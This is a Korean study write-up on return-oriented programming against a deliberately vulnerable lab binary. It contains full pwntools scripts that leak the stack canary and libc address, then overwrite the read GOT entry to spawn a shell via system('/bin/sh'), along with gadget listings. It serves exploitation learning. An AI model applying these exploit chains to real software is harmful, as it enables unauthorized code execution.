#ROP #canary #GOT_Overwrite 

### 0. 프롤로그

ASLR 이 걸린 환경에서, system 함수를 사용하려면 프로세스에서 libc가 매핑된 주소를 찾고, 그 주소로부터 system 함수의 오프셋을 이용하여 함수의 주소를 계산하는 방법을 이용한다.
ROP 는 이런 복잡한 제약사항을 유연하게 해결할 수 있는 수단을 제공한다.

##### 핵심 아이디어
- **libc는 통째로 한 덩어리**로 메모리에 올라감.
    - 즉, libc가 어디에 올라가든 내부 구조는 그대로.
    - `system()`, `printf()`, `/bin/sh` 문자열 등은 항상 같은 **상대적 위치(오프셋)** 에 있음.
        
- 따라서 필요한 건:
    - (1) 실행 중인 프로세스에서 **libc가 어디에 매핑됐는지 시작 주소**(`base address`)    
    - (2) 그 안에서 `system()` 이 어디에 있는지 알려주는 **오프셋**
        
- 공격 과정:
    - 프로그램 실행 중에 어떤 함수(예: `puts`)의 주소를 **leak** 하면,
    - 그 함수가 libc 내부에서 `base address`로부터 얼마나 떨어져 있는지(오프셋)는 고정되어 있으니,
    - `base address` = leak된 함수 주소 − 해당 함수 오프셋
    - `system()` 주소 = `base address + system 오프셋`

##### Return Oriented Programming

ROP 는 리턴 가젯을 사용하여 복잡한 실행 흐름을 구현하는 기법이다. 공격자는 이를 이용해서 문제 상황에 맞춰 return to library, return to dl-resolve, GOT overwrite 등의 페이로드를 구성할 수 있다.

ROP 페이로드는 리턴 가젯으로 구성되는데, ret 단위로 여러 코드가 연쇄적으로 실행되는 모습에서 ROP chain 이라고도 부른다.
### 1. 파일 정보

file ./rop
./rop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2a3cdeb61fd5777406ca296e2fa0a679996adbda, not stripped

checksec --file=./rop
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols            FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   68 Symbols   No    0               2               ./rop

### 2. C 소스코드 분석

``` c
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie
// -fno-PIE -no-pie: 실행파일 내 함수/심볼 주소가 고정

#include <stdio.h>
#include <unistd.h> // write

int main() {
  char buf[0x30]; // 48바이트 

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  /*
  write(1, "Buf: ", 5);
  1 : 표준 출력(stdout)의 파일 디스크립터 번호
  "Buf: " : 문자열 리터럴 (메모리에 저장된 데이터)
  5 : "Buf: " 중 앞의 5바이트만 출력

  문자열 "Buf: "는 6글자 ('B', 'u', 'f', ':', ' ', ' ')
  하지만 count=5 이므로 -> "Buf: " 뒤의 공백 하나는 잘림.
  개행문자(\n) 없음 -> 출력 후 프롬프트가 같은 줄에 붙을 수 있음.
  */
  puts("[1] Leak Canary");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);

  return 0;
}
```

### 3. 익스플로잇 설계

#### 1) 카나리 우회

#### 2) system 함수의 주소 계산

system 함수는 libc.so.6 에 정의되어 있으며, 해당 라이브러리에는 read, puts, printf도 정의되어 있다.
라이브러리 파일은 메모리에 매핑될 때 전체가 매핑되므로, 다른 함수와 함께 system 함수도 프로세스 메모리에 같이 적재된다.

바이너리가 system 함수를 직접 호출하지 않아서 system 함수가 GOT에는 등록되지 않았다. 그러나 read, puts, printf 는 GOT에 등록되어 있다. main 함수에서 반환될 때는 이 함수들을 모두 호출한 이후이므로, 이들의 GOT를 읽을 수 있다면 libc.so.6가 매핑된 영역의 주소를 구할 수 있다.

libc에는 여러 버전이 있는데 같은 libc 안에서 두 데이터 사이의 거리(offset)는 항상 같다. 그러므로 사용하는 libc의 버전을 알 때, libc가 매핑된 영역의 임의 주소를 구할 수 있다면 다른 데이터의 주소를 모두 계산할 수 있다.

libc 파일이 있으면 다음과 같이 readelf 명령어로 함수의 오프셋을 구할 수 있다.
```
$ readelf -s libc.so.6 | grep " read@"
   289: 0000000000114980   157 FUNC    GLOBAL DEFAULT   15 read@@GLIBC_2.2.5
$ readelf -s libc.so.6 | grep " system@"
  1481: 0000000000050d60    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```

rop.c 에서는 read, puts, printf 가 GOT에 등록되어 있으므로, 하나의 함수를 정해서 그 함수의 GOT 값을 읽고, 그 함수의 주소와 system 함수 사이의 거리를 이용해서 system 함수의 주소를 구해낼 수 있다.

#### 3) "/bin/sh"

이 바이너리는 데이터 영역에 "/bin/sh" 문자열에 없다. 따라서 이 문자열을 임의 버퍼에 직접 주입하여 참조하거나, 다른 파일에 포함된 것을 사용해야 한다. 
후자의 방법을 선택할 때 많이 사용하는 것이 libc.so.6 에 포함된 "/bin/sh" 문자열이다. 이 문자열의 주소도 system 함수의 주소를 계산할 때처럼 libc 영역의 임의 주소를 구하고, 그 주소로보터 거리를 더하거나 빼서 계산할 수 있다.
이 방법은 주소를 알고 있는 버퍼에 "/bin/sh"를 입력하기 어려운때 차선책으로 사용될 수 있다.
```
$ gdb rop
pwndbg> start
pwndbg> search /bin/sh
Searching for value: '/bin/sh'
libc.so.6       0x7ffff7f5a698 0x68732f6e69622f /* '/bin/sh' */
```

#### 4) GOT Overwrite

system 함수와 "/bin/sh" 문자열의 주소를 알고 있으므로, pop rdi; ret 가젯을 활용하여 system("/bin/sh")를 호출할 수 있다. 그러나 system 함수의 주소를 알았을 때는 이미 ROP 페이로드가 전송된 이후이므로, system 함수의 주소를 페이로드에 사용하면 main 함수로 돌아가서 다시 버퍼 오버플로우를 일으켜야 한다. 이러한 공격 패턴을 ret2main 이라고 함.

이번에는 GOT Overwrite 기법을 통해 함전에 셸을 획득 할 것임.

Dynamic Link VS. Static Link 에서 Lazy binding 에 대해 배운 내용을 정리해 보면
1. 호출한 라이브러리 함수의 주소를 프로세스에 매핑된 라이브러리에서 찾는다.
2. 찾은 주소를 GOT에 적고, 이를 호출한다.
3. 해당 함수를 다시 호출할 경우, GOT 에 적힌 주소를 그대로 참조한다.

위 과정에서 GOT Overwrite에 이용되는 부분은 3번이다. GOT 에 적힌 주소를 검증하지 않고 참조하므로 GOT 에 적힌 주소를 변조할 수 있다면, 해당 함수가 재호출될 때 공격자가 원하는 코드가 실행되게 할 수 있다.

알아낸 system 함수의 주소를 어떤 함수의 GOT에 쓰고, 그 함수를 재호출하도록 ROP 체인을 구성하면 된다.

### 익스플로잇

#### 1) 카나리 우회

``` python
#!/usr/bin/env python3
# Name: rop.py
from pwn import *

# 로그 찍을 때 편하게 쓰는 함수
# 예: slog('canary', 0x12345678) → [+] canary: 0x12345678 같은 출력.
def slog(name, addr): return success(': '.join([name, hex(addr)]))

# ELF('./rop): rop 바이너리의 ELF 정보를 읽어옴(함수 주소, 심볼, GOT등)
p = process('./rop')
e = ELF('./rop')

# [1] Leak canary
# buf: [rbp-0x40], canary: [rbp-0x08]
# 0x40 - 0x08 + 1 = 0x39
# 프로그램이 "Buf: "를 출력할 때까지 기다렸다가 buf 전송
# 프로그램이 printf("Buf: %s\n", buf)로 A * 0x39 를 출력하므로 그 부분을 소비
# cnry = u64(b'\x00' + p.recvn(7))
# : 이어서 출력되는 건 Canary의 나머지 7바이트임
# : Canary의 첫 바이트는 \x00 으로 고정이므로 앞에 붙이고,
# : p.recvn(7) 으로 나머지 바이트를 받아서 총 8바이트 만들고, u64()로 정수로 변환.
buf = b'A' * 0x39
p.sendafter(b"Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)
```

#### 2) system 함수의 주소 계산

read 함수의 got를 읽고, read 함수와 system 함수의 오프셋을 이용하여 system 함수의 주소를 계산.

ELF.symbols
: 특정 ELF 에서 심볼 사이의 오프셋을 계산할 때 유용하게 사용.
```
#!/usr/bin/env python3
from pwn import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
read_system = libc.symbols["read"]-libc.symbols["system"]
```

write 와 pop rdi; ret 가젯, 그리고 pop rsi; opp r15; ret 가젯을 사용하여 read 함수의 GOT를 읽고, 이를 이용해서 system 함수의 주소를 구하기.

$ ROPgadget --binary ./rop --re "ret"
```
ROPgadget --binary ./rop --re "ret"    
Gadgets information
============================================================
0x0000000000400639 : add ah, dh ; nop dword ptr [rax + rax] ; repz ret
0x000000000040063f : add bl, dh ; ret
.............
0x0000000000400678 : pop rbp ; ret
0x0000000000400853 : pop rdi ; ret
0x0000000000400851 : pop rsi ; pop r15 ; ret
0x000000000040084d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
.............
0x000000000040085a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; repz ret

Unique gadgets found: 43
```

``` python
#!/usr/bin/env python3
# Name: rop.py
from pwn import *

# 로그 찍을 때 편하게 쓰는 함수
# 예: slog('canary', 0x12345678) → [+] canary: 0x12345678 같은 출력.
def slog(name, addr): return success(': '.join([name, hex(addr)]))

# ELF('./rop): rop 바이너리의 ELF 정보를 읽어옴(함수 주소, 심볼, GOT등)
p = process('./rop')
e = ELF('./rop')
libc = ELF('./libc.so.6')

# [1] Leak canary
'''
buf: [rbp-0x40], canary: [rbp-0x08]
0x40 - 0x08 + 1 = 0x39
프로그램이 "Buf: "를 출력할 때까지 기다렸다가 buf 전송
프로그램이 printf("Buf: %s\n", buf)로 A * 0x39 를 출력하므로 그 부분을 소비
cnry = u64(b'\x00' + p.recvn(7))
: 이어서 출력되는 건 Canary의 나머지 7바이트임
: Canary의 첫 바이트는 \x00 으로 고정이므로 앞에 붙이고,
: p.recvn(7) 으로 나머지 바이트를 받아서 총 8바이트 만들고, u64()로 정수로 변환.
'''
buf = b'A' * 0x39
p.sendafter(b"Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Exploit
'''
GOT(Global Offset Table)
    라이브러리 함수의 실제 주소가 저장되는 공간
    즉, 실행 도중 동적 로더가 채워 넣음
    read@got = read 함수의 실제 libc 상 주소를 담고 있는 메모리 위치

PLT(Procedure Linkage Table)
    외부 함수로 점프할 때 쓰는 중간 점프 코드
    실행파일 안에 짧은 stub 함수처럼 들어 있음
    결국엔 GOT 에 적힌 주소를 참조해서 실제 libc 함수로 점프

%%%% 익스폴로잇에서는 
    PLT(write_plt)는 함수 호출용으로 쓰이고,
    GOT(read_got)는 leak 대상(실제 주소를 얻을 메모리)으로 쓰임.

$ ROPgadget --binary ./rop --re "ret" 을 이용하여 rdi와 rsi를 이용할 수 있는 가젯을 뽑아냄.



'''
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851

payload = b'A' * 0x38 + p64(cnry) + b'B' * 0x8

# write(1, read_got, ...)
'''
pop rdi; ret -> rdi = 1 (stdout)
pop rsi; pop r15; ret -> rsi = read@got, r15 = dummy
write_plt 호출 -> write(1, read_got, ...)
==> 결과 : read 함수의 실제 libc 주소가 화면에 출력됨.
'''
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

'''
공격자는 익스프로잇 페이로드를 stdin으로 보냄
프로그램은 Buf: 프롬프트 이후, payload를 read() 로 입력받아 버퍼 오버플로우를 발생시킴
리턴주소가 우리가 만든 pop rdi -> pop rsi -> write@plt 체인으로 바뀜
실행 시점에서 write(1, read_got, 8)이 실행됨.

write() 호출 결과 = stdout 으로 read@got 에 들어있는 값이 출력됨.
GOT에는 실행 시점에 실제 libc의 read() 함수 주소가 들어있음
x64 주소는 보통 6바이트(48비트)만 유효 -> p.recvn(6)으로 읽음
뒤에 \x00 2개를 붙여서 8바이트 정리 후 u64()로 정수 변환.
p.recvn(6) → b'\x70\xd2\x7a\xf7\xff\x7f'
+ b'\x00\x00'
u64() → 0x7ffff77ad270   (실제 read() 함수의 libc 주소)

libe base 구하기
우리가 얻은 read() 실제 주소 - read 의 오프셋 = libc base
libc base + system 오프셋 = 실제 system() 주소
'''
p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(6) + b'\x00' * 2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)

p.interactive()

```

#### 3) Got Overwrite 및 "/bin/sh" 입력

"/bin/sh"는 덮어쓸 GOT 엔트리 뒤에 같이 입력하면 된다. 이 바이너리에서는 입력을 위해 read 함수를 이용할 수 있다. 
read 함수은 입력 스트림, 입력 버퍼, 입력 길이, 총 세 개의 인자를 필요로 한다. 함수 호출 규약에 따르면 설정해야 하는 레지스터는 rdi, rsi, rdx 이다.

그런데 마지막  rdx와 관련된 가젯은 바이너리에서 찾기 어렵다.
이럴때는 libc의 코드 가젯이나 libc_csu_init 가젯을 사용하여 문제를 해결할 수 있다.
또는 rdx의 값을 변화시키는 함수를 호출해서 값을 설정할 수도 있다. 
예를 들어 strncmp 함수는 rax로 비교의 결과를 반환하고, rdx로 두 문자열의 첫 번째 문자부터 가장 긴 부분 문자열의 길이를 반환한다.
```
$ ROPgadget --binary ./libc.so.6 --re "pop rdx"
...
0x000000000011f497 : pop rdx ; pop r12 ; ret
0x0000000000090529 : pop rdx ; pop rbx ; ret
...
0x0000000000108b13 : pop rdx ; pop rcx ; pop rbx ; ret
...
```

이번 실습에서는 read 함수의 GOT를 읽은 뒤 rdx 값이 어느정도 크게 설정되므로 rdx를 설정하는 가젯을 추가하지 않아도 된다.

##### 이 익스플로잇은 
“**read@GOT 를 system 으로 갈아끼우고, 그 바로 뒤에 '/bin/sh' 문자열을 같이 심어둔 다음, read@plt 를 한 번 더 호출해서 사실상 system('/bin/sh') 를 부르게 하는**” 트릭이다.

``` python
#!/usr/bin/env python3
# Name: rop.py
from pwn import *

# 로그 찍을 때 편하게 쓰는 함수
# 예: slog('canary', 0x12345678) → [+] canary: 0x12345678 같은 출력.
def slog(name, addr): return success(': '.join([name, hex(addr)]))

# ELF('./rop): rop 바이너리의 ELF 정보를 읽어옴(함수 주소, 심볼, GOT등)
p = process('./rop')
e = ELF('./rop')
libc = ELF('./libc.so.6')

# [1] Leak canary
'''
buf: [rbp-0x40], canary: [rbp-0x08]
0x40 - 0x08 + 1 = 0x39
프로그램이 "Buf: "를 출력할 때까지 기다렸다가 buf 전송
프로그램이 printf("Buf: %s\n", buf)로 A * 0x39 를 출력하므로 그 부분을 소비
cnry = u64(b'\x00' + p.recvn(7))
: 이어서 출력되는 건 Canary의 나머지 7바이트임
: Canary의 첫 바이트는 \x00 으로 고정이므로 앞에 붙이고,
: p.recvn(7) 으로 나머지 바이트를 받아서 총 8바이트 만들고, u64()로 정수로 변환.
'''
buf = b'A' * 0x39
p.sendafter(b"Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Exploit
'''
GOT(Global Offset Table)
    라이브러리 함수의 실제 주소가 저장되는 공간
    즉, 실행 도중 동적 로더가 채워 넣음
    read@got = read 함수의 실제 libc 상 주소를 담고 있는 메모리 위치

PLT(Procedure Linkage Table)
    외부 함수로 점프할 때 쓰는 중간 점프 코드
    실행파일 안에 짧은 stub 함수처럼 들어 있음
    결국엔 GOT 에 적힌 주소를 참조해서 실제 libc 함수로 점프

%%%% 익스폴로잇에서는 
    PLT(write_plt)는 함수 호출용으로 쓰이고,
    GOT(read_got)는 leak 대상(실제 주소를 얻을 메모리)으로 쓰임.

$ ROPgadget --binary ./rop --re "ret" 을 이용하여 rdi와 rsi를 이용할 수 있는 가젯을 뽑아냄.



'''
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400854
# ret = 0x0000000000400596

payload = b'A' * 0x38 + p64(cnry) + b'B' * 0x8

# write(1, read_got, ...)
'''
read 실제 주소 leak을 위한 페이로드
write()에 의해 화면에 출력되어지는 정보를 u64(p.recvn(6) + b'\x00' * 2) 에서 이용함.

pop rdi; ret -> rdi = 1 (stdout)
pop rsi; pop r15; ret -> rsi = read@got, r15 = dummy
write_plt 호출 -> write(1, read_got, ...)
==> 결과 : read 함수의 실제 libc 주소가 화면에 출력됨.
'''
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...)
'''
두번째 단계 -> read@GOT를 system 주소로 덮고, 곧바로 '/bin/sh' 문자열을 어어서 씀
read@GOT 주소 + 8 의 위치에 문자열을 편법으로 저장하는 것.

ROP 체인중 read(0, read@got, rdx)를 호출함.
여기에서 프로세스는 read@got에 입력을 기다리며 대기함
사용자가 작성한 스크립트가 p64(system) + b'/bin/sh\x00'를 한 방에 전송함.
결과적으로 메모리상태는 :
[ read@got ]        = system 주소 (8바이트)
[ read@got + 0x08 ] = "/bin/sh\x00"
'''
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
'''
마지막 호출 -> read@plt를 다시 호출하지만, 이미 GOT가 system 으로 바뀜

이어지는 ROP에서 rdi = read@got + 0x08 로 세팅(= "/bin/sh"의 주소)
ret로 스택 정렬(16바이트 정렬) 후 read@plt 호출
하지만 read@GOT가 system 주소로 바뀌어 있어서, 이 호출은 곧 system(read@got+8) = system("/bin/sh")가 된다. 
셀 획득 하게됨. 
'''
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)


'''
공격자는 익스프로잇 페이로드를 stdin으로 보냄
프로그램은 Buf: 프롬프트 이후, payload를 read() 로 입력받아 버퍼 오버플로우를 발생시킴
리턴주소가 우리가 만든 pop rdi -> pop rsi -> write@plt 체인으로 바뀜
실행 시점에서 write(1, read_got, 8)이 실행됨.

write() 호출 결과 = stdout 으로 read@got 에 들어있는 값이 출력됨.
GOT에는 실행 시점에 실제 libc의 read() 함수 주소가 들어있음
x64 주소는 보통 6바이트(48비트)만 유효 -> p.recvn(6)으로 읽음
뒤에 \x00 2개를 붙여서 8바이트 정리 후 u64()로 정수 변환.
p.recvn(6) → b'\x70\xd2\x7a\xf7\xff\x7f'
+ b'\x00\x00'
u64() → 0x7ffff77ad270   (실제 read() 함수의 libc 주소)

libe base 구하기
우리가 얻은 read() 실제 주소 - read 의 오프셋 = libc base
libc base + system 오프셋 = 실제 system() 주소
'''
p.sendafter(b'Buf: ', payload)
read = u64(p.recvn(6) + b'\x00' * 2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()

```

#### 4) 셸 획득

로컬에서 오류 뜸.
리모트는 오류 없음.
Why?????
Ubuntu22.04에서 테스트 해 봐야 하나?
